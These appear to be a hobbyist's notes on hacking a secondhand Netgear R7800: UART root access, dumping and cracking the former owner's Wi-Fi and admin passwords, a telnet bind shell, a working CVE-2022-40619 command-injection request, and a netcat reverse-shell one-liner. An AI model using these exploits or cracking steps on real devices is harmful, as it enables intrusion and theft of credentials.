# netgear
Notes for Netgear R7800

# Thirfting
I found a Netgear R7800 at a local thrift store, it was priced at $9.99 but it was 20% off day so I was out the door for less than $9 after tax.
<img src="https://github.com/maguireja/netgear/blob/b1546eec3635e6b43bf14a6fd5d3226c1ab586a2/netgear.png">

# Powering up
I plugged in the router and to my surprise, the router had not been reset to a factory default before being donated. I observed the following SSID broadcasted:
<img src="https://github.com/maguireja/netgear/blob/92d5ef63adb5aaa382886b7a4d19818efef5f901/SSID.png">
...do with that what you will...

# Password Recovery
Now that I realized the router was still configured, I wondered if I could recover the password for the wireless network, as well as any other configured passwords. I followed along with Matt Brown's video here which was fantastic. I recommend subscribing to Matt's channel he has some really good content.
Video here: https://youtu.be/7iuwY3hIcHw?si=osBN4qiOezMgb0qB

# Locating UART
I opened up the case and found four pins that look like UART, but they were not labeled. I was able to follow the steps in Matt's video and use a multimeter to locate the Ground, Send and Recieve pins.
<img src="https://github.com/maguireja/netgear/blob/4a948d08c5084d1741fed89ba6b057aac21a280b/R7800%20pins.png">

Next I used a Flipper Zero and a laptop running Kali Linux to connect to the UART port. I used the Flipper's USB-UART Bridge Module with the following config:
```
Baud 115200
```

# Dumping NVRAM
On the Kali laptop I ran the following command to locate the flipper:
```
ls /dev/serial/by-id
```
The output of this command should provide you with the unique name for your flipper. With that you can run the following screen command to enter in to the UART port:
```
screen /dev/serial/by-id/usb-Flipper_Devices_Inc.Flipper_UNIQUE_ID_HERE
```
After running the screen command and letting the netgear boot up, I was dropped into an root shell on the netgear:
```
BusyBox v1.4.2 (2018-12-10 10:26:59 UTC) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

     MM           NM                    MMMMMMM          M       M
   $MMMMM        MMMMM                MMMMMMMMMMM      MMM     MMM
  MMMMMMMM     MM MMMMM.              MMMMM:MMMMMM:   MMMM   MMMMM
MMMM= MMMMMM  MMM   MMMM       MMMMM   MMMM  MMMMMM   MMMM  MMMMM'
MMMM=  MMMMM MMMM    MM       MMMMM    MMMM    MMMM   MMMMNMMMMM
MMMM=   MMMM  MMMMM          MMMMM     MMMM    MMMM   MMMMMMMM
MMMM=   MMMM   MMMMMM       MMMMM      MMMM    MMMM   MMMMMMMMM
MMMM=   MMMM     MMMMM,    NMMMMMMMM   MMMM    MMMM   MMMMMMMMMMM
MMMM=   MMMM      MMMMMM   MMMMMMMM    MMMM    MMMM   MMMM  MMMMMM
MMMM=   MMMM   MM    MMMM    MMMM      MMMM    MMMM   MMMM    MMMM
MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
  MMMMMMM:      MMMMMMM     M         MMMMMMMMMMMM  MMMMMMM MMMMMMM
    MMMMMM       MMMMN     M           MMMMMMMMM      MMMM    MMMM
     MMMM          M                    MMMMMMM        M       M
       M
 ---------------------------------------------------------------
   For those about to rock... (%C, %R)
 ---------------------------------------------------------------
root@R7800:/#
```
Next I ran the <i>show nvram</i> command from Matt's video, and I found the following entries in the output:
```
wl_wpa2_psk=[REDACTED]
wla_wpa2_psk=[REDACTED]
```
The two redacted values were the same, I tested them out and they were the pre shared key for the wireless network.

# Password Cracking
While I had found the preshared key for the network, I did not have the admin password to log in to the routers web management portal. I tried the preshared key thinking the previous owner would just reuse the same password, but they did not. Looking through the output of the <i>show nvram</i> command, I saw the following lines:
```
http_passwd_digest=[REDACTED]
http_passwd=[REDACTED]
```
Similiar to the preshared key, both redacted strings were the same. But they were not plaintext passwords, they looked like hashed or encoded passwords. I checked them with Hash ID:
```
$hashid hash
Analyzing 'REDACTED'
[+] Snefru-256
[+] SHA-256
[+] RIPEMD-256
[+] Haval-256
[+] GOST R 34.11-94
[+] GOST CryptoPro S-Box
[+] SHA3-256
[+] Skein-256
[+] Skein-512(256)
--End of file 'hash'--
```

The only hash type here that I'm remotely familiar with is SHA-256, so I thought I'd take a chance and try cracking the string as a SHA-256 hash.  I used Hashcat with the rockyou2024 wordlist and the rockyou-30000 ruleset:
```
./hashcat.bin -a 0 -m 1400 test-hash ~/tools/wordlists/rockyou2024.txt -r rules/rockyou-30000.rule
```
After nearly a full day, I had cracked the hash and recovered the plaintext password:
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 47521790546b87fbff76c89e3af8433af43c0f26734edbefc44...21eccf
Time.Started.....: Tue Feb 11 09:39:52 2025 (21 hours, 18 mins)
Time.Estimated...: Wed Feb 12 06:58:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/hpn/tools/wordlists/rockyou2024.txt)
Guess.Mod........: Rules (rules/rockyou-30000.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1854.6 MH/s (11.94ms) @ Accel:64 Loops:256 Thr:32 Vec:1
Speed.#2.........:   993.0 MH/s (10.39ms) @ Accel:128 Loops:64 Thr:64 Vec:1
Speed.#*.........:  2847.5 MH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 173279177015296/298457185890000 (58.06%)
Rejected.........: 0/173279177015296 (0.00%)
Restore.Point....: 5775478784/9948572863 (58.05%)
Restore.Sub.#1...: Salt:0 Amplifier:7936-8192 Iteration:0-256
Restore.Sub.#2...: Salt:0 Amplifier:16704-16768 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#1....: cami1212nd806 -> camlin8657275
Candidates.#2....: kamille_09rose1 -> camilosantamari101
Hardware.Mon.#1..: Temp: 78c Fan: 95% Util: 99% Core:1875MHz Mem:6800MHz Bus:16
Hardware.Mon.#2..: Temp: 73c Fan: 60% Util: 99% Core:1923MHz Mem:4513MHz Bus:4

Started: Tue Feb 11 09:39:51 2025
Stopped: Wed Feb 12 06:58:08 2025
```

# Adding a bind shell
While the UART interface is cool, it would be more convient to connect to the device through a shell. An easy way to do this is to add a new binary to the device. 

There's a really nice repo of precompiled binaries here:
https://github.com/therealsaumil/static-arm-bins

I could not get wget or curl to work on the router itself, wget gave the following error:
```
root@R7800:~# wget https://github.com/therealsaumil/static-arm-bins/raw/refs/heads/master/telnetd-static
https://github.com/therealsaumil/static-arm-bins/raw/refs/heads/master/telnetd-static: HTTPS support not compiled in.
```

Curl just failed to download the file, when I enabled verbose output it looked like there were SSL errors. It seems like the versions of curl and wget are too old for github. I didn't troubleshoot this all the much, I just downloaded the binary to my laptop and served it to the router from there:
```
hroot@R7800:~# wget ttp://192.168.1.3:8000/telnetd-static
Connecting to 192.168.1.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 541964 (529K) [application/octet-stream]
Saving to: `telnetd-static'

100%[======================================>] 541,964     --.-K/s   in 0.01s   

2025-02-18 17:20:04 (45.0 MB/s) - `telnetd-static' saved [541964/541964]

```
Then run the binary after downloading:
```
root@R7800:~# ./telnetd-static -p 1234
```

On the laptop, use the telnet client to connect to the new telnet server:
``` telnet 192.168.1.1 1234
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
 === LOGIN ===============================
  Please enter your password,It's the same
  with DUT login password
 ------------------------------------------
telnet password:[REDACTED]
=== IMPORTANT ============================
 Use 'passwd' to set your login password
 this will disable telnet and enable SSH
------------------------------------------


BusyBox v1.4.2 (2018-12-10 10:26:59 UTC) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

     MM           NM                    MMMMMMM          M       M
   $MMMMM        MMMMM                MMMMMMMMMMM      MMM     MMM
  MMMMMMMM     MM MMMMM.              MMMMM:MMMMMM:   MMMM   MMMMM
MMMM= MMMMMM  MMM   MMMM       MMMMM   MMMM  MMMMMM   MMMM  MMMMM'
MMMM=  MMMMM MMMM    MM       MMMMM    MMMM    MMMM   MMMMNMMMMM
MMMM=   MMMM  MMMMM          MMMMM     MMMM    MMMM   MMMMMMMM
MMMM=   MMMM   MMMMMM       MMMMM      MMMM    MMMM   MMMMMMMMM
MMMM=   MMMM     MMMMM,    NMMMMMMMM   MMMM    MMMM   MMMMMMMMMMM
MMMM=   MMMM      MMMMMM   MMMMMMMM    MMMM    MMMM   MMMM  MMMMMM
MMMM=   MMMM   MM    MMMM    MMMM      MMMM    MMMM   MMMM    MMMM
MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
  MMMMMMM:      MMMMMMM     M         MMMMMMMMMMMM  MMMMMMM MMMMMMM
    MMMMMM       MMMMN     M           MMMMMMMMM      MMMM    MMMM
     MMMM          M                    MMMMMMM        M       M
       M
 ---------------------------------------------------------------
   For those about to rock... (%C, %R)
 ---------------------------------------------------------------
```
And it works! It does require a password, and the password is the same password for the web interface. I am not sure how exactly the new telnet server knows where to find this password. This needs more research

Mount Output
```
root@R7800:~# mount
rootfs on / type rootfs (rw)
/dev/root on /rom type squashfs (ro,relatime)
proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime,size=0k)
tmpfs on /dev type tmpfs (rw,relatime,size=512k,mode=755)
devpts on /dev/pts type devpts (rw,relatime,mode=600)
none on /proc/bus/usb type usbfs (rw,relatime)
ubi0:overlay_volume on /overlay type ubifs (rw,relatime)
overlayfs:/overlay on / type overlayfs (rw,relatime,lowerdir=/,upperdir=/overlay)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
```

crontab outout
```
root@R7800:~/etc/crontabs# pwd
/tmp/etc/crontabs
root@R7800:~/etc/crontabs# ls
root
root@R7800:~/etc/crontabs# cat root 
0 2 * * * 11k_scan &
-25 02 * * * streamboost update_fmn; streamboost auto_upload; streamboost auto_update && streamboost restart
```

# Enabling Telnet
I spent awhile trying to figure out how to get the telnet binary to run on boot, and didn't have any luck. While researching, I found that the version of firmware on my router supports a special debugging page. On the debugging page, you can simply enable telnet:
<img src="https://github.com/maguireja/netgear/blob/main/Screenshot_2025-02-28_11-45-43.png?raw=true">

# Recreating CVE-2022-40619
While checking out the filesystem, I found a folder named _funjsq_
```
root@R7800:/data/funjsq/bin# ls
FYdaemon         funjsq_conntime  funjsq_dns       funjsq_redis
funjsq.sh        funjsq_ctl       funjsq_httpd     funjsq_time.sh
funjsq_cli       funjsq_daemon    funjsq_inetd
funjsq_config    funjsq_detect    funjsq_nslookup
```
I googled funjsq trying to figure out what it was and found the following article, describing the software and a CVE for unauthenticated command injection
https://www.onekey.com/resource/security-advisory-netgear-routers-funjsq-vulnerabilities

I tried out the basic proof of concept from the article, and it works as expected:
**HTTP Request**
```
GET /apply_bind.cgi?action_mode=funjsq_bind&funjsq_access_token=e594ff4c36742acf006cdf16%27|id>a|%27 HTTP/1.1
Host: 192.168.1.1:12300
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```
**HTTP Response**
```
HTTP/1.0 200 Ok
Server: funjsq_httpd
Date: Fri, 28 Feb 2025 17:56:40 GMT
X-UA-Compatible: IE=EmulateIE7
Cache-Control: no-cache
Pragma: no-cache
Expires: 0
Content-Type: text/html
Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, AccessToken
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Max-Age: 3600
Connection: close

{
   "code": 1000,
     "msg":"bind success"
}
```
File created on the routers / directory:
```
root@R7800:/# pwd
/
root@R7800:/# cat a 
uid=0(root) gid=0(root)
```

This was cool, and I wondered if I could create a PoC to get a reverse shell. I ran into a few challanges. First the version of nc included on the Netgear's busybox, does not support the _-e_ flag. However, using you can still use netcat to get a reverse shell with this oneliner:
'''
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
'''
source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

The next issue I ran into was length. Because the payload is appended to the access key, you can only send about 25 characters in a single post request. My solution was to just echo the oneliner into a bash script over 4 or 5 post requests, change the permission then execute the bash script. There may be a better way but I was able to get this to work.


